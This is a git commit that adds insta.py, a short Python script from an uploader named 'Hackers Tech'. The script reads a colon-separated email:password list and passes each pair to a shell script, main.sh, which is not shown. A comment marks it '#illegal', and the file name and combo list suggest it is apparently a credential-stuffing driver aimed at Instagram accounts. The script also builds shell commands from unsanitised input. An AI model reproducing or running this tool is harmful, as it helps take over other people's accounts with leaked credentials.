72a6ea8224e2ab677501da01e53d16659d5ed9a9
Hackers Tech <83658615+HackersTech@users.noreply.github.com>
2021-10-08 08:41:30 +0530

    Add files via upload

---
+++ insta.py
@@ -0,0 +1,15 @@
+#illegal !!!!!
+##file of email:pass  colon separated else change file  separator
+print('instagram id - \033[1;32m hackers__tech\033[0m')
+
+import os
+os.system('bash banner.sh')
+e=input("enter email:pass txt file ")
+with open(e,'r') as file:
+    i =file.readlines()
+    for k in i:
+        m=k.split(':')   ###change file separator if
+        user,passw=m
+        os.system(f"bash main.sh {user} {passw}")
+
+
